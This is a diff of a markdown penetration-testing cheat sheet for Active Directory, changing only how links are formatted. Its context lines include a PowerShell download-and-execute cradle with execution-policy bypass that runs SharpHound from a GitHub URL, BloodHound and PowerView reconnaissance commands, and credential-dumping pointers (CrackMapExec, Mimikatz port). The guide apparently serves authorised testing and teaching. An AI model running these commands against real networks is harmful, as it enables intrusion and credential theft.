@@ -6,7 +6,7 @@ Use BloodHound to find compromission paths. First execute the collector on a hos
 ```powershell
 powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1’);Invoke-BloodHound"
 ```
-If it's possible, execute SharpHound. On Linux, you can use the python version. More information here : https://github.com/BloodHoundAD/SharpHound and https://github.com/fox-it/BloodHound.py
+If it's possible, execute SharpHound. On Linux, you can use the python version. More information here : <https://github.com/BloodHoundAD/SharpHound> and <https://github.com/fox-it/BloodHound.py>
 ```bash
 python3 bloodhound.py -u 'XXX' -dc 'DOMAIN' -c all
 ```
@@ -32,7 +32,7 @@ Then, a lot of functionalities can be used. To find all domain shares :
 ```powershell
 Find-DomainShare -CheckShareAccess
 ```
-All the functionalities here : https://powersploit.readthedocs.io/en/latest/Recon/
+All the functionalities here : <https://powersploit.readthedocs.io/en/latest/Recon/>
 ## Dump credentials
 ### CrackMapExec
 Many possibilites. Use --local-auth if using a local admin account.
@@ -72,7 +72,7 @@ Native Windows command :
 ```markdown
 rundll32 keymgr.dll, KRShowKeyMgr
 ```
-Savoir : Mimikatz recompiled in Go lang : https://github.com/vincd/savoir
+Savoir : Mimikatz recompiled in Go lang : <https://github.com/vincd/savoir>
 ## Impersonation
 To execute commands with another account :
 ```powershell
